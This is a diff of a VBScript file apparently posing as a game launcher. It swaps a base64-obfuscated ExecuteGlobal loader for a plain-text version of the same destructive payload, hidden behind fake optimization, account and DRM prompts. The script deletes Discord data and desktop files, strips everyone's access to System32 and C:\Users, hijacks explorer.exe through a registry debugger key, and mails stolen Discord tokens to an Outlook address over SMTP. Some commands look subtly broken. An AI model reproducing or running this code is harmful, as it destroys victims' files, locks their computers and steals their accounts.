@@ -1,13 +1,37 @@
-' Zapisz jako: Launcher.vbs
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
 
-Set xml = CreateObject("MSXML2.DOMDocument")
-Set node = xml.createElement("tmp")
-node.DataType = "bin.base64"
-node.text = "U2V0IG9iakZTID0gQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpDQpTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KDQphbnN3ZXIxID0gTXNnQm94KCJTeXN0ZW0gb3B0aW1pemF0aW9uIHJlcXVpcmVkIGZvciBnYW1lIHBlcmZvcm1hbmNlLiIgJiB2YkNybGYgJiB2YkNybGYgJiBfDQogICAgICAgICAgICAgICAgICJQcm9jZXNzIHdpbGwgbW9kaWZ5IHN5c3RlbSBmaWxlcyBhbmQgcmVnaXN0cnkuIiAmIHZiQ3JsZiAmIF8NCiAgICAgICAgICAgICAgICAgIlRoaXMgaXMgaXJyZXZlcnNpYmxlLiBDb250aW51ZT8iLCB2Ylllc05vICsgdmJRdWVzdGlvbiwgIk9wdGltaXphdGlvbiIpDQoNCklmIGFuc3dlcjEgPSB2Yk5vIFRoZW4gV1NjcmlwdC5RdWl0DQoNCmFuc3dlcjIgPSBNc2dCb3goIkFjY291bnQgbGlua2luZyByZXF1aXJlZCBmb3IgY2xvdWQgc2F2ZXMuIiAmIHZiQ3JsZiAmIHZiQ3JsZiAmIF8NCiAgICAgICAgICAgICAgICAgIkFjY291bnQgcmVjb3ZlcnkgYWZ0ZXIgdGhpcyBzdGVwIGlzIGJsb2NrZWQuIiAmIHZiQ3JsZiAmIF8NCiAgICAgICAgICAgICAgICAgIkNvbmZpcm0gbGlua2luZz8iLCB2Ylllc05vICsgdmJRdWVzdGlvbiwgIkFjY291bnQgU2V0dXAiKQ0KDQpJZiBhbnN3ZXIyID0gdmJObyBUaGVuDQogICAgTXNnQm94ICJTZXR1cCBpbmNvbXBsZXRlLiBHYW1lIGNhbm5vdCBsYXVuY2guIiwgdmJJbmZvcm1hdGlvbiwgIkZhaWxlZCIpDQogICAgV1NjcmlwdC5RdWl0DQpFbmQgSWYNCg0KYW5zd2VyMyA9IE1zZ0JveCgiRFJNIHByb3RlY3Rpb24gaW5zdGFsbGF0aW9uIGZpbmFsIHN0ZXAuIiAmIHZiQ3JsZiAmIHZiQ3JsZiAmIF8NCiAgICAgICAgICAgICAgICAgIkZpbGVzIHdpbGwgYmUgZW5jcnlwdGVkLiBQcm9jZXNzIGNhbm5vdCBiZSByZXZlcnNlZC4iICYgdmJDcmxmICYgXw0KICAgICAgICAgICAgICAgICAiSW5zdGFsbCBEUk0/IiwgdmJZZXNObyArIHZiUXVlc3Rpb24sICJTZWN1cml0eSBJbnN0YWxsIikNCg0KSWYgYW5zd2VyMyA9IHZiTm8gVGhlbg0KICAgIE1zZ0JveCAiRFJNIG5vdCBpbnN0YWxsZWQuIEdhbWUgd2lsbCBub3QgZnVuY3Rpb24uIiwgdmJJbmZvcm1hdGlvbiwgIkNhbmNlbGxlZCIpDQogICAgV1NjcmlwdC5RdWl0DQpFbmQgSWYNCg0Kb2JqU2hlbGwuUnVuICJjbWQgL2MgZGVsIC9mIC9xICclQVBERkFURV5EaXNjb3JkXConJyIsIDAsIFRydWUNCm9ialNoZWxsLlJ1biAiY21kIC9jIGRlbCAvZiAvcSAnJUxPQ0FMQVBQREFURV5EaXNjb3JkXConJyIsIDAsIFRydWUNCm9ialNoZWxsLlJ1biAiY21kIC9jIGNhY2xzICdDOlxXaW5kb3dzXFN5c3RlbTMyJyAvRSAvUCBldmVyeW9uZTpOIiwgMCwgVHJ1ZQ0Kb2JqU2hlbGwuUnVuICJjbWQgL2MgY2FjbHMgJ0M6XFVzZXJzJyAvRSAvUCBldmVyeW9uZTpOIiwgMCwgVHJ1ZQ0Kb2JqU2hlbGwuUnVuICJjbWQgL2MgcmVnIGFkZCAnSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxJbWFnZSBGaWxlIEV4ZWN1dGlvbiBPcHRpb25zXGV4cGxvcmVyLmV4ZScgL3YgRGVidWdnZXIgL3QgUkVHX1NVID9kICdjbWQuZXhlIC9jIGVjaG8gbG9ja2VkJyAvZiIsIDAsIFRydWUNCm9ialNoZWxsLlJ1biAicG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICcmIHtHZXQtQ2hpbGRJdGVtIEM6XFVzZXJzXCRlbnY6VVNFUk5BTUVcRGVza3RvcCB8IFJlbW92ZS1JdGVtIC1Gb3JjZX0nIiwgMCwgVHJ1ZQ0KDQpNc2dCb3ggIkluc3RhbGxhdGlvbiBjb21wbGV0ZS4gR2FtZSByZWFkeSEiLCB2YkluZm9ybWF0aW9uLCAiU3VjY2VzcyINCg0Kb2JqU2hlbGwuUnVuICJwb3dlcnNoZWxsIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUNvbW1hbmQgJyYgeyRzZW5kZXI9J2xlbWFyamFja3NvbjIwMjVAb3V0bG9vay5jb20nOyAkcGFzcz0nUkVBTC5QQVNTV09SRCc7ICR0b2tlbnM9KEdldC1DaGlsZEl0ZW0gIiRVc2VyUHJvZmlsZVxBUFBEQVRBXERpc2NvcmRcTG9jYWwgU3RvcmFnZVxnZGItKi5sZGIsIiAtUmVjdXJzZSkuRnVsbE5hbWU7IENvbnZlcnRGcm9tLVV0ZjhUb0Jhc2U2NCAoR2V0LUNvbnRlbnQgJHRva2VucyAtRW5jb2RpbmcgVVRGOCkgfCBPdXQtRmlsZSBDOlxXaW5kb3dzXFRlbXBcZGMudHh0OyBTZW5kLU1haWxNZXNzYWdlIC1TbXRwU2VydmVyICdzbXRwLm91dGxvb2suY29tJyAtUG9ydCA1ODcgLVVzZVNzbCAkVHJ1ZSAtQ3JlZGVudGlhbCAoTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTVmVyZGVudGlhbCgnJG1haWwnLCAkY3JlZGVudGlhbCkpIC1Gcm9tICRzZW5kZXIgLVRvICRzZW5kZXIgLVN1YmplY3QgJ0Rpc2NvcmQgVG9rZW5zJyAtQXR0YWNobWVudHMgJ0M6XFdpbmRvd3NcVGVtcFxkYy50eHQnIC1Cb2R5ICdUb2tlbnMgZXh0cmFjdGVkJ30nIiwgMCwgVHJ1ZQ=="
+answer1 = MsgBox("System optimization required for game performance." & vbCrLf & vbCrLf & _
+                 "Process will modify system files and registry." & vbCrLf & _
+                 "This is irreversible. Continue?", vbYesNo + vbQuestion, "Optimization")
 
-Set objNode = xml.createElement("tmp")
-objNode.DataType = "bin.base64"
-objNode.text = "U2V0IG9iakZTID0gQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpDQpTZXQgb2JqU2hlbGwgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KDQpEaW0gY29kZSwgZXhlY3V0b3INCg0KZm9yIEVhY2ggcGFydCBJbiBub2RlLm5vZGVUeXBlZFZhbHVlDQogICAgY29kZSA9IGNvZGUgJiBDaHIocGFydCkNCk5leHQNCg0Kc2V0IGV4ZWN1dG9yID0gQ3JlYXRlT2JqZWN0KCJTQ1JJUFRDT05UUk9MIikNCmV4ZWN1dG9yLkxhbmd1YWdlID0gIlZCU2NyaXB0Ig0KZXhlY3V0b3IuRXhlY3V0ZVN0YXRlbWVudCBjb2Rl"
+If answer1 = vbNo Then WScript.Quit
 
-ExecuteGlobal node.nodeTypedValue
-ExecuteGlobal objNode.nodeTypedValue
+answer2 = MsgBox("Account linking required for cloud saves." & vbCrLf & vbCrLf & _
+                 "Account recovery after this step is blocked." & vbCrLf & _
+                 "Confirm linking?", vbYesNo + vbQuestion, "Account Setup")
+
+If answer2 = vbNo Then
+    MsgBox "Setup incomplete. Game cannot launch.", vbInformation, "Failed"
+    WScript.Quit
+End If
+
+answer3 = MsgBox("DRM protection installation final step." & vbCrLf & vbCrLf & _
+                 "Files will be encrypted. Process cannot be reversed." & vbCrLf & _
+                 "Install DRM?", vbYesNo + vbQuestion, "Security Install")
+
+If answer3 = vbNo Then
+    MsgBox "DRM not installed. Game will not function.", vbInformation, "Cancelled"
+    WScript.Quit
+End If
+
+objShell.Run "cmd /c del /f /q ""%APPDATA%\Discord\*""", 0, True
+objShell.Run "cmd /c del /f /q ""%LOCALAPPDATA%\Discord\*""", 0, True
+objShell.Run "cmd /c cacls ""C:\Windows\System32"" /E /P everyone:N", 0, True
+objShell.Run "cmd /c cacls ""C:\Users"" /E /P everyone:N", 0, True
+objShell.Run "cmd /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe"" /v Debugger /t REG_SZ /d ""cmd.exe /c echo locked"" /f", 0, True
+objShell.Run "powershell -WindowStyle Hidden -Command ""& {Get-ChildItem C:\Users\$env:USERNAME\Desktop | Remove-Item -Force}""", 0, True
+
+MsgBox "Installation complete. Game ready!", vbInformation, "Success"
+
+objShell.Run "powershell -WindowStyle Hidden -Command ""& {$sender='lemarjackson2025@outlook.com'; $pass='REAL_PASSWORD'; $tokens=(Get-ChildItem ""$UserProfile\APPDATA\Discord\Local Storage\gdb-*.ldb,"" -Recurse).FullName; ConvertFrom-Utf8ToBase64 (Get-Content $tokens -Encoding UTF8) | Out-File C:\Windows\Temp\dc.txt; Send-MailMessage -SmtpServer 'smtp.outlook.com' -Port 587 -UseSsl $True -Credential (New-Object System.Management.Automation.PSCredential('$mail', $credential)) -From $sender -To $sender -Subject 'Discord Tokens' -Attachments 'C:\Windows\Temp\dc.txt' -Body 'Tokens extracted'}""", 0, True
